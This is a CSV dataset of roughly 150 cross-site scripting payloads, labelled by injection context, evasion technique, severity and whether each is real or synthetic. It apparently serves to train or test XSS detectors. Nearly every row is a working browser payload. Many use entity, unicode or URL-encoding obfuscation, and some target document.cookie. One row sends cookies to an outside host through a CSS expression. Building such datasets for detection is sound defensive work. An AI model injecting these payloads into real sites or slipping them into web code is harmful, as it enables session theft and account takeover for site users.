payload,context,technique,severity,length,source
<x/onxxx=1,event_handler,none,low,10,real
<svg onbegin=console.log('XSS')/>,tag_injection,synthetic,medium,33,synthetic
"<abbr draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",event_handler,none,medium,86,real
<svg><template onload=alert(1)></template>,event_handler,none,medium,42,real
"<fieldset onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</fieldset>",event_handler,none,medium,91,real
javascript:\u0061lert(document.domain),js_uri,synthetic,medium,38,synthetic
"j&#97;vascript:confirm(String.fromCharCode(88,83,83))",js_uri,synthetic,medium,53,synthetic
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('AnonKryptiQuz')"")}</STYLE>",js_uri,case_variation,medium,88,real
<nobr onpointerover=alert(1) style=display:block>AnonKryptiQuz</nobr>,event_handler,none,medium,69,real
"""><script+src=""https://api.cmi.aol.com/content/alert/homepage-alert?site=usaol&callback=confirm(1);//jQuery20108887725116629929_1528071050373472232&_=1528071050374""></script>",script_injection,none,medium,174,real
JavAscRipT:pRomPt('XSS'),js_uri,synthetic,medium,24,synthetic
"<style>@keyframes slidein {}</style><a style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></a>",event_handler,none,medium,156,real
"#""onmouseover=""alert(1)",event_handler,none,medium,23,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dfn id=x style=""position:absolute;"" onanimationcancel=""print()""></dfn>",event_handler,none,low,175,real
"<video controls autoplay onratechange=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",event_handler,none,medium,101,real
<section id=x tabindex=1 ondeactivate=alert(1)></section><input id=y autofocus>,event_handler,none,medium,79,real
<svg onmouseover=\u0061lert(document.cookie)>,tag_injection,synthetic,medium,45,synthetic
"<i onmouseleave=""alert(1)"">AnonKryptiQuz</i>",event_handler,none,medium,44,real
"<ol onmousemove=""alert(1)"">AnonKryptiQuz</ol>",event_handler,none,medium,45,real
"""`'><script>\x0Bjavascript:alert(1)</script>",script_injection,none,medium,44,real
"<meta oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</meta>",event_handler,none,medium,60,real
<isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>,event_handler,none,medium,80,real
<kbd onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</kbd><input value=clickme>,event_handler,none,medium,106,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><custom tags id=x style=""position:absolute;"" onanimationcancel=""print()""></custom tags>",event_handler,none,low,191,real
"<style>:target {transform: rotate(180deg);}</style><svg id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></svg>",event_handler,none,medium,124,real
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f,event_handler,html_entity,low,56,real
%22><svg onmouseover=prompt(document.cookie)>,tag_injection,synthetic,medium,45,synthetic
"<xmp onmouseover=""alert(1)"">AnonKryptiQuz</xmp>",event_handler,none,medium,47,real
%3Csvg onmouseenter=confirm(document.domain)%3E,tag_injection,synthetic,medium,47,synthetic
<button popovertarget=x>Click me</button><noembed onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</noembed>,event_handler,none,medium,110,real
"%22><svg onload=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,54,synthetic
"<audio2 ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</audio2>",event_handler,none,medium,93,real
"<blink onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</blink>",event_handler,none,medium,70,real
"<hr onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",event_handler,none,medium,63,real
"&#101;v&#97;l(""confirm(loc&#97;tion.h&#97;sh)"")",dom_sink,synthetic,medium,47,synthetic
"<rp onclick=""alert(1)"" style=display:block>AnonKryptiQuz</rp>",event_handler,none,medium,61,real
"<mark draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</mark>",event_handler,none,medium,66,real
"<article onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</article>",event_handler,none,medium,73,real
"<style>@keyframes slidein {}</style><noembed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noembed>",event_handler,none,medium,168,real
<body onpopstate=alert(1)>,event_handler,none,medium,26,real
<button popovertarget=x>Click me</button><input3 ontoggle=alert(1) popover id=x>AnonKryptiQuz</input3>,event_handler,none,medium,102,real
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>,script_injection,case_variation,medium,74,real
%3Cscript%3E/x/prompt(1)%3C/script%3E,script_injection,synthetic,medium,37,synthetic
"<image onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</image>",event_handler,none,medium,63,real
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,script_injection,unicode_escape,low,50,real
<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>,event_handler,none,medium,82,real
""" oNmoUseEntEr=ConFirM(1) """,attribute_escape,synthetic,medium,27,synthetic
"<div draggable=""true"" contenteditable>drag me</div><label ondragover=alert(1) contenteditable style=display:block>drop here</label>",event_handler,none,medium,131,real
"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(1)"">DEF",js_uri,none,medium,64,real
"<hgroup onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</hgroup>",event_handler,none,medium,71,real
<svg onlo&#97;d=prompt(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,51,synthetic
"""><svg onmous&#101;ov&#101;r=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection,synthetic,medium,71,synthetic
"<script onLoad script onLoad=""javascript:javascript:alert(1)""></script onLoad>",script_injection,none,medium,78,real
"<;IMG SRC=`javascript:alert("";RSnake says, ';XSS';"";)`>;",js_uri,none,medium,56,real
""" onclick=console.log('XSS') """,attribute_escape,synthetic,medium,30,synthetic
<frameset contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,62,real
"<meta draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</meta>",event_handler,none,medium,66,real
"<style>@keyframes x{}</style><form style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></form>",event_handler,none,medium,101,real
<embed onpointerup=alert(1) style=display:block>AnonKryptiQuz</embed>,event_handler,none,medium,69,real
<small onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
<script>&#97;l&#101;rt(docum&#101;nt.dom&#97;in)</script>,script_injection,synthetic,medium,57,synthetic
<h1 onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,64,real
<svg onload=console.log('XSS')>,tag_injection,synthetic,medium,31,synthetic
""" onfocus=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,66,synthetic
<shadow onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
<dt onpointerdown=alert(1) style=display:block>AnonKryptiQuz</dt>,event_handler,none,medium,65,real
"<area onmousedown=""alert(1)"">AnonKryptiQuz</area>",event_handler,none,medium,49,real
"<rt onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</rt>",event_handler,none,medium,61,real
"<blockquote onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</blockquote>",event_handler,none,medium,80,real
<ruby onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</ruby><input value=clickme>,event_handler,none,medium,99,real
"<ol onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</ol>",event_handler,none,medium,64,real
"<dd onclick=""alert(1)"" style=display:block>AnonKryptiQuz</dd>",event_handler,none,medium,61,real
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>,script_injection,none,low,80,real
"<embed src=""#!
alert(1)"" codebase=javascript:>",generic,protocol,medium,46,real
<select onfocusout=alert(1) id=x></select><input autofocus>,event_handler,none,medium,59,real
<output onpointerup=alert(1) style=display:block>AnonKryptiQuz</output>,event_handler,none,medium,71,real
<svg><figcaption onload=alert(1)></figcaption>,event_handler,none,medium,46,real
"<ul onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</ul>",event_handler,none,medium,65,real
"<b oncut=""alert(1)"" contenteditable>AnonKryptiQuz</b>",event_handler,none,medium,53,real
<script>Object.prototype.BOOMR = 1;,script_injection,none,low,35,real
"<cite draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</cite>",event_handler,none,medium,81,real
"""'><img src=xxx:x onerror\x0C=javascript:alert(1)>",js_uri,none,medium,50,real
"<frame draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</frame>",event_handler,none,medium,88,real
"<style>@keyframes x{}</style><div style=""animation-name:x"" onanimationend=""alert(1)""></div>",event_handler,none,medium,91,real
"<video autoplay controls onpause=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",event_handler,none,medium,96,real
"""><svg onload=alert&amp;amp;#x27;#x00000040""1"")>",event_handler,none,low,48,real
"<rb ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</rb>",event_handler,none,medium,85,real
"""><svg onmous&#101;&#101;nt&#101;r=confirm(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,66,synthetic
"<kbd onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</kbd>",event_handler,none,medium,65,real
"<canvas onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</canvas>",event_handler,none,medium,69,real
"<svg onmouseup=""alert(1)"">AnonKryptiQuz</svg>",event_handler,none,medium,45,real
"<style>:target {color:red;}</style><form id=x style=""transition:color 1s"" ontransitionstart=alert(1)></form>",event_handler,none,medium,108,real
%3F%20<script>prompt(document.domain)</script>,script_injection,url_encoding,medium,46,real
"<dialog onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</dialog>",event_handler,none,medium,68,real
"<video onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</video>",event_handler,none,medium,86,real
<nav onpointerout=alert(1) style=display:block>AnonKryptiQuz</nav>,event_handler,none,medium,66,real
"<STYLE TYPE=""text/javascript"">alert(1);</STYLE>",attribute_escape,case_variation,medium,47,real
<head id=x tabindex=1 onfocus=alert(1)></head>,event_handler,none,medium,46,real
"<noscript draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</noscript>",event_handler,none,medium,74,real
<img onload=\u0061lert(location.hash)/>,tag_injection,synthetic,medium,39,synthetic
"<style>:target {transform: rotate(180deg);}</style><article id=x style=""transition:transform 2s"" ontransitionrun=print()></article>",event_handler,none,low,131,real
"<li onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</li>",event_handler,none,medium,64,real
"<div draggable=""true"" contenteditable>drag me</div><ins ondragover=alert(1) contenteditable style=display:block>drop here</ins>",event_handler,none,medium,127,real
<iframe2 onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</iframe2><input value=clickme>,event_handler,none,medium,105,real
"<form onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</form>",event_handler,none,medium,84,real
' oNbeGin=prOmpT('XSS') ',attribute_escape,synthetic,medium,25,synthetic
""" onbegin=\u0061lert(location.hash) """,attribute_escape,synthetic,medium,37,synthetic
"<details onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</details>",event_handler,none,medium,67,real
"<audio oncontextmenu=""alert(1)"">AnonKryptiQuz</audio>",event_handler,none,medium,53,real
"<sub draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</sub>",event_handler,none,medium,64,real
<iframe src=%(scriptlet)s <,tag_injection,none,low,27,real
eval('alert(1)');,dom_sink,encoding,high,17,real
"<legend draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</legend>",event_handler,none,medium,88,real
<img onload=alert(document.domain)>,tag_injection,synthetic,medium,35,synthetic
"<thead onmouseleave=""alert(1)"">AnonKryptiQuz</thead>",event_handler,none,medium,52,real
"<rb draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</rb>",event_handler,none,medium,62,real
"<col oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
"<style>@keyframes slidein {}</style><title style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></title>",event_handler,none,medium,164,real
"<progress onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</progress>",event_handler,none,medium,75,real
"<frame ondblclick=""alert(1)"">AnonKryptiQuz</frame>",event_handler,none,medium,50,real
"%3Csvg onmouseenter=confirm(String.fromCharCode(88,83,83))/%3E",tag_injection,synthetic,medium,62,synthetic
"<summary draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</summary>",event_handler,none,medium,92,real
"<center onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</center>",event_handler,none,medium,72,real
<summary onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
"JavAscRipT:cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))",js_uri,synthetic,medium,49,synthetic
"&lt;STYLE TYPE=\""text/javascript\""&gt;alert('XSS');&lt;/STYLE&gt;",generic,none,medium,65,real
"<caption onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</caption>",event_handler,none,medium,75,real
"<div draggable=""true"" contenteditable>drag me</div><marquee ondrop=alert(1) contenteditable>drop here</marquee>",event_handler,none,medium,111,real
"javascript:alert()//\ /*<svg/onload=';alert();'></textarea></style></title></noscript></template></noembed><frame onload="";alert();""></script>--><script>alert`;alert();`</script>*/alert()//\"";alert()//",script_injection,comment_injection,medium,201,real
"<track onclick=""alert(1)"">AnonKryptiQuz</track>",event_handler,none,medium,47,real
"<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location=""http://www.procheckup.com/?sid=""%2bdocument.cookie)>",dom_sink,comment_injection|url_encoding,high,105,real
"<embed onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</embed>",event_handler,none,medium,86,real
"<link ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</link>",event_handler,none,medium,89,real
javaSCRIPT&colon;confirm(1),generic,none,medium,27,real
"<multicol oncut=""alert(1)"" contenteditable>AnonKryptiQuz</multicol>",event_handler,none,medium,67,real
"<sub ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</sub>",event_handler,none,medium,87,real
"<wbr ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</wbr>",event_handler,none,medium,87,real
"<rb onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</rb>",event_handler,none,medium,65,real
"<style>:target {transform: rotate(180deg);}</style><script id=x style=""transition:transform 2s"" ontransitionrun=print()></script>",script_injection,none,low,129,real
"""><img src=x onerror='alert(document.domain)'>",event_handler,none,medium,46,real
""" oNfoCus=coNfiRm(DocUmeNt.CooKie) """,attribute_escape,synthetic,medium,36,synthetic
""" onbegin=console.log(document.cookie) """,attribute_escape,synthetic,medium,40,synthetic
"<a+href=""javas&#99;ript&#35;alert(1);"">",attribute_escape,html_entity,medium,39,real
"<form id=""AnonKryptiQuz"" /><button form=""AnonKryptiQuz"" formaction=""javascript:javascript:alert(1)"">X",js_uri,none,medium,101,real
%27 onerror=confirm(document.cookie) %27,attribute_escape,synthetic,medium,40,synthetic
<sub onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</sub><input value=clickme>,event_handler,none,medium,106,real
"<time onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</time>",event_handler,none,medium,61,real
"""%3E%3Csvg onmouseover=prompt('XSS')%3E",tag_injection,synthetic,medium,39,synthetic
<q id=x tabindex=1 ondeactivate=alert(1)></q><input id=y autofocus>,event_handler,none,medium,67,real
"<multicol draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</multicol>",event_handler,none,medium,69,real
<svg onerror=\u0061lert(document.cookie)>,tag_injection,synthetic,medium,41,synthetic
